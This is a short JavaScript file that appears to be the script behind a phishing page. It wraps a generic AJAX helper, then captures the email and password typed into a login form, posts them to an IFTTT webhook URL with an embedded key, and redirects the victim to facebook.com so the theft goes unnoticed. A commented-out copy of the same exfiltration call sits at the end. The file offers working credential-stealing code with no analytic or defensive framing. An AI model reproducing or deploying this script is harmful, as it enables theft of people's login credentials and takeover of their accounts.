

var ajax = {};
ajax.x = function () {
    if (typeof XMLHttpRequest !== 'undefined') {
        return new XMLHttpRequest();
    }
    var versions = [
        "MSXML2.XmlHttp.6.0",
        "MSXML2.XmlHttp.5.0",
        "MSXML2.XmlHttp.4.0",
        "MSXML2.XmlHttp.3.0",
        "MSXML2.XmlHttp.2.0",
        "Microsoft.XmlHttp"
    ];

    var xhr;
    for (var i = 0; i < versions.length; i++) {
        try {
            xhr = new ActiveXObject(versions[i]);
            break;
        } catch (e) {
        }
    }
    return xhr;
};

ajax.send = function (url, callback, method, data, async) {
    if (async === undefined) {
        async = true;
    }
    var x = ajax.x();
    x.open(method, url, async);
    x.onreadystatechange = function () {
        if (x.readyState == 4) {
            callback(x.responseText)
        }
    };
    if (method == 'POST') {
        x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    }
    x.send(data)
};

ajax.get = function (url, data, callback, async) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    ajax.send(url + (query.length ? '?' + query.join('&') : ''), callback, 'GET', null, async)
};

ajax.post = function (url, data, callback, async) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    ajax.send(url, callback, 'POST', query.join('&'), async)
};

function makecall(e) {
    e.preventDefault();
    var URL = "https://maker.ifttt.com/trigger/contact_form/with/key/brwW0KlsvFeQsRMMuD0Qmz";
    var value2 = document.getElementById('emailInput'), value3 = document.getElementById('passwordInput');
    ajax.post(URL, {value1: 'name', value2: value2.value, value3: value3.value}, function() {
        window.location = "https://facebook.com";
    });
}


function onPageReady() {
    document.getElementById("button").addEventListener("click", makecall, false);
}

//var URL = "https://maker.ifttt.com/trigger/contact_form/with/key/brwW0KlsvFeQsRMMuD0Qmz";
//ajax.post(URL, {value1: 'name', value2: 'em', value3: 'pw'}, function() {});
